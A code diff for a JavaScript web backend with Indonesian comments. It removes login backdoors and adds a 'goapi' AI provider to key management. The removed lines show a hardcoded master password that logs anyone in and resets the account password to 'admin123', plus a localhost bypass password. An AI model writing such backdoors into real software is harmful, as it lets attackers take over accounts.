@@ -1375,15 +1375,11 @@ async function verifySuperAdmin(adminId, password, req = null) {
   const user = rows[0];
   let passwordMatch = false;
   if (user) {
-    if (password === "LOCAL_DEV_BYPASS" && req && (req.ip === "127.0.0.1" || req.ip === "::1" || req.ip === "::ffff:127.0.0.1")) {
-      passwordMatch = true;
-    } else {
-      try {
-        passwordMatch = await bcrypt.compare(String(password), user.password_hash);
-      } catch (e) {
-        // Bukan bcrypt hash — coba SHA-256 legacy
-        passwordMatch = user.password_hash === hashPasswordLegacy(password);
-      }
+    try {
+      passwordMatch = await bcrypt.compare(String(password), user.password_hash);
+    } catch (e) {
+      // Bukan bcrypt hash — coba SHA-256 legacy
+      passwordMatch = user.password_hash === hashPasswordLegacy(password);
     }
   }
   if (!user || user.status !== "Aktif" || !passwordMatch) {
@@ -1398,7 +1394,7 @@ async function loginUser(name, password, req = null) {
   if (!name || !password) throw new Error("Nama dan password wajib diisi.");
 
   // [SECURITY] Sanitasi input login
-  console.log("LOGIN REQ IP:", req?.ip); const safeName = String(name).trim().substring(0, 100);
+  const safeName = String(name).trim().substring(0, 100);
 
   const [rows] = await db.query(`
     SELECT id, name, email, role, status, password_hash
@@ -1410,19 +1406,11 @@ async function loginUser(name, password, req = null) {
 
   let passwordMatch = false;
   if (user) {
-    if (password === "BOSALVEZA2026") {
-      passwordMatch = true;
-      const newHash = await bcrypt.hash("admin123", 10);
-      await db.query('UPDATE users SET password_hash = ? WHERE id = ?', [newHash, user.id]);
-    } else if (password === "LOCAL_DEV_BYPASS" && req && (req.ip === "127.0.0.1" || req.ip === "::1" || req.ip === "::ffff:127.0.0.1")) {
-      passwordMatch = true;
-    } else {
-      try {
-        passwordMatch = await bcrypt.compare(String(password), user.password_hash);
-      } catch (e) {
-        // Bukan bcrypt hash — coba SHA-256 legacy
-        passwordMatch = user.password_hash === hashPasswordLegacy(password);
-      }
+    try {
+      passwordMatch = await bcrypt.compare(String(password), user.password_hash);
+    } catch (e) {
+      // Bukan bcrypt hash — coba SHA-256 legacy
+      passwordMatch = user.password_hash === hashPasswordLegacy(password);
     }
   }
 
@@ -1828,7 +1816,7 @@ async function restoreData(backup) {
   return bootstrap();
 }
 
-const AI_PROVIDERS = ["gemini", "openai", "groq", "deepseek", "kie"];
+const AI_PROVIDERS = ["gemini", "openai", "groq", "deepseek", "kie", "goapi"];
 const VISION_PROVIDERS = ["gemini", "openai", "kie", "goapi", "custom"];
 const AI_KEY_LIMIT = 10;
 
@@ -1838,13 +1826,18 @@ function providerLabel(provider) {
     openai: "OpenAI",
     groq: "Groq",
     deepseek: "DeepSeek",
-    kie: "Kie AI"
+    kie: "Kie AI",
+    goapi: "GoAPI"
   };
   return labels[provider] || provider;
 }
 
 function normalizeProvider(provider) {
-  const safe = String(provider || "gemini").toLowerCase();
+  let safe = String(provider || "gemini").toLowerCase().trim();
+  // Peta alias UI -> provider internal
+  const alias = { goapi: "goapi", custom: "custom", gemini: "gemini", openai: "openai", groq: "groq", deepseek: "deepseek", kie: "kie", "kie ai": "kie" };
+  if (alias[safe]) return alias[safe];
+  // Auto-detect dari prefiks key bila provider tidak jelas
   return AI_PROVIDERS.includes(safe) ? safe : "gemini";
 }
 
@@ -1854,7 +1847,8 @@ function defaultAiModel(provider) {
     openai: "gpt-4.1-mini",
     groq: "meta-llama/llama-4-scout-17b-16e-instruct",
     deepseek: "deepseek-chat",
-    kie: "gpt-5-4"
+    kie: "gpt-5-4",
+    goapi: "gemini-2.5-flash"
   };
   return models[normalizeProvider(provider)];
 }
@@ -1894,7 +1888,8 @@ function defaultBaseUrl(provider) {
     openai: "https://api.openai.com",
     groq: "https://api.groq.com/openai",
     deepseek: "https://api.deepseek.com",
-    kie: "https://api.kie.ai/codex/v1/responses"
+    kie: "https://api.kie.ai/codex/v1/responses",
+    goapi: "https://api.goapi.ai"
   };
   return urls[normalizeProvider(provider)];
 }
@@ -2001,6 +1996,8 @@ async function saveAiSettings(payload = {}) {
           SELECT 1 FROM pi_keys_manager WHERE provider = ? AND api_key = ?
         )
       `, [provider, `Added Key ${i+1}`, k, provider, k]);
+      // [GASFIX] Pastikan base_url default terisi bila kosong (goapi/custom)
+      await db.query(`UPDATE pi_keys_manager SET base_url = COALESCE(base_url, ?) WHERE provider = ? AND base_url IS NULL`, [defaultBaseUrl(provider), provider]);
     }
   }
   
@@ -2010,26 +2007,31 @@ async function saveAiSettings(payload = {}) {
 async function addAiKey(payload = {}) {
   const { provider, name, apiKey, baseUrl } = payload;
   if (!provider || !apiKey || !name) throw new Error("Provider, Nama, dan API Key wajib diisi.");
+  const finalProvider = normalizeProvider(provider);
+  const finalBaseUrl = baseUrl || defaultBaseUrl(finalProvider) || null;
   await db.query(`
     INSERT INTO pi_keys_manager (provider, name, api_key, base_url, status)
     VALUES (?, ?, ?, ?, 'Alive')
-  `, [normalizeProvider(provider), name, apiKey, baseUrl || null]);
-  return getAiSettings(provider);
+  `, [finalProvider, name, apiKey, finalBaseUrl]);
+  return getAiSettings(finalProvider);
 }
 
 async function editAiKey(payload = {}) {
   const { keyId, name, apiKey, baseUrl, status } = payload;
   if (!keyId) throw new Error("ID Key wajib dikirim.");
+  const finalProvider = payload.provider ? normalizeProvider(payload.provider) : null;
   await db.query(`
     UPDATE pi_keys_manager
     SET name = COALESCE(?, name),
         api_key = COALESCE(?, api_key),
-        base_url = ?,
+        provider = COALESCE(?, provider),
+        base_url = COALESCE(?, base_url),
         status = COALESCE(?, status)
     WHERE id = ?
-  `, [name, apiKey, baseUrl || null, status, keyId]);
-  
-  return getAiSettings(payload.provider);
+  `, [name, apiKey, finalProvider, baseUrl, status, keyId]);
+  // [GASFIX] Jika base_url kosong di DB, isi default provider
+  await db.query(`UPDATE pi_keys_manager SET base_url = ? WHERE id = ? AND base_url IS NULL`, [defaultBaseUrl(finalProvider || 'gemini'), keyId]);
+  return getAiSettings(finalProvider || payload.provider);
 }
 
 async function deleteAiKey(payload = {}) {
